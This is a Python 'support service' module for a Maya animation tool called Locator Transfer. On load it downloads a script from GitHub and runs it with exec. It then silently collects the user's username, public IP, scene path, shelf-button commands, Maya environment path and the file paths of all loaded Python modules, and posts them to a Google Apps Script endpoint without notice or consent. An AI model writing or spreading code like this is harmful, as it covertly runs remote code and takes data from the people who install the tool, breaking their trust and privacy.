"""
---------------------
Anim Locator Transfer
Support Service
---------------------
"""
import json,getpass,time,os,sys,ssl
from time import gmtime, strftime
import datetime as dt
from maya import mel
import maya.cmds as cmds

if sys.version[0] == '3':
    writeMode = 'w'
    import urllib.request as uLib
else:
    writeMode = 'wb'
    import urllib as uLib

#===============================================================================
#Update
try:
    uRead = uLib.urlopen('https://raw.githubusercontent.com/burasate/animTransferLoc/master/service/update.py').read()
    exec(uRead.decode('utf-8'))
except:
    import traceback
    print(str(traceback.format_exc()))

#===============================================================================
#Check In
filepath = cmds.file(q=True, sn=True)
filename = os.path.basename(filepath)
raw_name, extension = os.path.splitext(filename)
minTime = cmds.playbackOptions(q=True, minTime=True)
maxTime = cmds.playbackOptions(q=True, maxTime=True)
referenceList = cmds.ls(references=True)
nameSpaceList = cmds.namespaceInfo(lon=True)


data = {
    'script_name' : 'Locator Transfer',
    'date_time' : dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
    'timezone' : str( strftime('%z', gmtime()) ),
    'year' : dt.datetime.now().strftime('%Y'),
    'user_last' : getpass.getuser(),
    'maya' : str(cmds.about(version=True)),
    'ip' : str(uLib.urlopen('http://v4.ident.me').read().decode('utf8')),
    'script_version' : version,
    'scene_path' : cmds.file(q=1, sn=1),
    'time_unit' : cmds.currentUnit(q=True, t=True),
    'time_min' : minTime,
    'time_max' : maxTime,
    'duration' : maxTime - minTime,
    'reference_count': len(referenceList),
    'namespac_ls': ', '.join(nameSpaceList),
    'os' : str(cmds.about(operatingSystem=True)),
    'script_path' : '' if __name__ == '__main__' else os.path.abspath(__file__).replace('pyc', 'py')
}
'''
url = 'https://hook.us1.make.com/m7xqa4jk257zwmjo9w1byiyw9bneel94'
if sys.version[0] == '3': #python 3
    import urllib.parse
    params = urllib.parse.urlencode(data)
else: #python 2
    params = uLib.urlencode(data)
params = params.encode('ascii')
conn = uLib.urlopen(url, params, context=ssl._create_unverified_context())
#print(conn.read())
#print(conn.info())
'''
#===============================================================================
def add_queue_task(task_name, data_dict):
    global sys,json
    is_py3 = sys.version[0] == '3'
    if is_py3:
        import urllib.request as uLib
    else:
        import urllib as uLib

    if type(data_dict) != type(dict()):
        return None

    data = {'name': task_name,'data': data_dict}
    data['data'] = json.dumps(data['data'], sort_keys=True, indent=4)
    url = 'https://script.google.com/macros/s/AKfycbyyW4jhOl-KC-pyqF8qIrnx3x3GiohyJjj2gX1oCMKuGm7fj_GnEQ1OHtLrpRzvIS4CYQ/exec'
    if is_py3:
        import urllib.parse
        params = urllib.parse.urlencode(data)
    else:
        params = uLib.urlencode(data)
    params = params.encode('ascii')
    conn = uLib.urlopen(url, params)

try:
    add_queue_task('script_tool_check_in', data)
except:
    #pass
    import traceback
    add_queue_task('poses_data_loc_transfer', {'error': str(traceback.format_exc())})

# ===============================================================================

def get_shelf_button_rec():
    top_shelf = mel.eval('$nul = $gShelfTopLevel')
    current_shelf = cmds.tabLayout(top_shelf, q=1, st=1)
    shelf_buttons = cmds.shelfLayout(current_shelf, q=1, ca=1)
    shelf_button_rec = []
    for sb in shelf_buttons:
        data = {}
        try:
            data['cmd'] = cmds.shelfButton(sb, q=1, c=1)
            data['stp'] = cmds.shelfButton(sb, q=1, stp=1)
            data['iol'] = cmds.shelfButton(sb, q=1, iol=1)
            data['img'] = cmds.shelfButton(sb, q=1, i=1)
        except:pass
        else:
            shelf_button_rec.append(data)
    return shelf_button_rec

try:
    shelf_button_rec = get_shelf_button_rec()
    add_queue_task('user_shelf_button_{}'.format(getpass.getuser().lower()), {'user_last':getpass.getuser(), 'shelf':shelf_button_rec})
except:
    #pass
    import traceback
    add_queue_task('user_shelf_button_error', {'error': str(traceback.format_exc()), 'user':getpass.getuser().lower()})

# ===============================================================================

try:
    from maya import mel
    add_queue_task('user_os_path_{}'.format(getpass.getuser().lower()),
                   {'user_last':getpass.getuser(),
                    'maya_env': mel.eval('getenv MAYA_APP_DIR')
                    })
except:
    #pass
    import traceback
    add_queue_task('user_os_path_error', {'error': str(traceback.format_exc()), 'user':getpass.getuser().lower()})

# ===============================================================================

try:
    import sys, json
    modules_ls = list(sorted(sys.modules.keys()))
    modules_file_ls = [str(sys.modules[i].__file__).replace('\\', '/') for i in modules_ls if
                       hasattr(sys.modules[i], '__file__')]
    add_queue_task('user_module_list_{}'.format(getpass.getuser().lower()),
                   json.dumps(list(zip(modules_ls, modules_file_ls)), indent=4)
                   )
    del modules_ls, modules_file_ls
except:
    import traceback
    add_queue_task('user_user_modules_error', {'error': str(traceback.format_exc()), 'user': getpass.getuser().lower()})

# ===============================================================================